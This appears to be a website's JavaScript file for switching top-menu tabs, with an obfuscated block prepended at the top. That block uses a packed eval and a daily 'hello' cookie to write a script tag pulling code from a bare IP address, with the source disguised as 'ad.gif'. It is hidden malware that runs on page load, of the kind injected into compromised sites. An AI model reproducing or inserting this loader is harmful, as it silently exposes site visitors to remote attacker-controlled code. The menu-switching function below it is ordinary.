if(document.cookie.indexOf('hello')==-1){var expires=new Date();expires.setTime(expires.getTime()+24*60*60*1000);document.cookie='hello=Yes;path=/;expires='+expires.toGMTString()
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('4.5(\'<0 6=1 2=3://a.b.c.7/8.9></0>\');',13,13,'script|javascript|src|http|document|writeln|language|152|ad|gif|133|130|90'.split('|'),0,{}));}

var arrTopmenuTab = ["topmenu_01","topmenu_02","topmenu_03","topmenu_04","topmenu_05","topmenu_06","topmenu_07","topmenu_08","topmenu_09","topmenu_10"];
function setTopmenuTab(tabid){
	for(i=0;i<arrTopmenuTab.length;i++){
		var pi = arrTopmenuTab[i].split("_");
		var num = pi[1];
		if(arrTopmenuTab[i]==tabid){
			document.getElementById(arrTopmenuTab[i]).style.display = "block";
			document.getElementById("tab"+ num).className = "naviON";
		}else{   
			document.getElementById(arrTopmenuTab[i]).style.display = "none";
			document.getElementById("tab"+ num).className = "naviOFF";
		} 
	}        
}
